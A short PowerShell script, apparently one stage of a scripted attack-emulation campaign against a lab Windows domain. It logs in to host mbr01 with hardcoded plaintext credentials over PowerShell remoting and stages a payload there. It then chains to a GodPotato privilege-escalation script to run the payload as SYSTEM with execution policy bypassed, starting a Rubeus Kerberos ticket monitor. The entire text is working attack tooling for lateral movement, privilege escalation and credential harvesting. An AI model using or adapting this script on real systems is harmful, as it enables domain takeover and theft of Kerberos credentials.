[CmdletBinding()]
param(
    [string]$Server = "192.168.77.22",
    [string]$Username = "analyst_t1",
    [string]$Password = "T13r_An@lyst!",
    [string]$GpPath = "C:\Windows\Temp\cadre-tools\GodPotato.exe",
    [string]$Payload = "C:\Windows\Temp\cadre-tools\campaign-a-t102-start-monitor-payload.ps1"
)
$ErrorActionPreference = "Stop"

# Stage monitor-start payload to mbr01
$cred = New-Object System.Management.Automation.PSCredential("child.cadre.local\$Username", (ConvertTo-SecureString $Password -AsPlainText -Force))
$session = New-PSSession -ComputerName "mbr01.child.cadre.local" -Credential $cred
Copy-Item -Path "$PSScriptRoot\campaign-a-t102-start-monitor-payload.ps1" -Destination $Payload -ToSession $session -Force
Remove-PSSession $session
Write-Output "MONITOR_PAYLOAD_STAGED"

# Start Rubeus monitor as SYSTEM via GodPotato chain
& "$PSScriptRoot\campaign-a-t043-system-exec.ps1" -Server $Server -Username $Username -Password $Password -GpPath $GpPath -ScriptBlock "powershell -NoProfile -ExecutionPolicy Bypass -File $Payload"
